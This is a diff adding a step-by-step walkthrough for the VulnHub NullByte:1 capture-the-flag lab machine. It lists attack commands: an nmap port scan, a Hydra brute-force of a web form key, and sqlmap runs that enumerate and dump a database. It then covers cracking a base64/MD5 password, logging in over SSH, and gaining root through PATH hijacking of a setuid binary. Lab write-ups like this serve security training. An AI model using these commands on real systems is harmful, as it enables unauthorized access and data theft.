@@ -1,0 +1,45 @@
+VulnHub
+
+NullByte:1
+
+Solution:
+
+1.	Scan The Ports
+	nmap -sV <ip>
+		80: http, 777: ssh
+
+2.	Open The Website & Examine The 'gif' Shown Using ImageMagick
+	Comments Section : <string>
+
+3.	Go To URL "http://<ip>/<string>/index.php" And Find The Form
+
+4.	Brute Force The Key Using Hydra
+	hydra -l "" -P <wordlist> <ip> http-post-form "<string>/index.php:key:^PASS^&Login:invalid key"
+		-l : Username
+		-L : Username List/File
+		-P : Password List/File
+		^PASS^ : Current Password Attempting
+		Login : Failed Attempt Marker
+
+5.	Enter The Password Into The Website Found Via Last Command.
+	Find Out The Form Requests "/<string>/420search.php?usrtosearch=<username>"
+
+6.	Find SQL Vulnerabilities Using 'sqlmap'
+	sqlmap -u "http://10.10.10.2/kzMb5nVYJw/420search.php?usrtosearch=a"
+
+7.	Find Databases, Tables, Columns & Dump Using 'sqlmap'
+	sqlmap -u "http://10.10.10.2/kzMb5nVYJw/420search.php?usrtosearch=a" --dbs
+	sqlmap -u "http://10.10.10.2/kzMb5nVYJw/420search.php?usrtosearch=a" -D <dbname> --table
+	sqlmap -u "http://10.10.10.2/kzMb5nVYJw/420search.php?usrtosearch=a" -D <dbname> -T <table> --columns
+	sqlmap -u "http://10.10.10.2/kzMb5nVYJw/420search.php?usrtosearch=a" -D <dbname> -T <table> -C <column_list> --dump
+
+8.	Find The Password. Decode It Using 'base64'. Then Decrypt It Using Online MD5 Decryptor
+
+9.	Use It To Login Via SSH Into The Machine
+	ssh -p 777 <username>@<ip>
+
+10.	Read ".bash_history" To Find Out SetUID Binary At "/var/www/backup/" Called "procwatch"
+
+11.	Examine It Using 'gdb' To Find Out It Calls 'ps' Command Without Absolute Path.
+
+12.	Fool The Script By Changing The 'PATH' Environment Variable & Putting Your Own 'ps' Script To Gain Root Access.
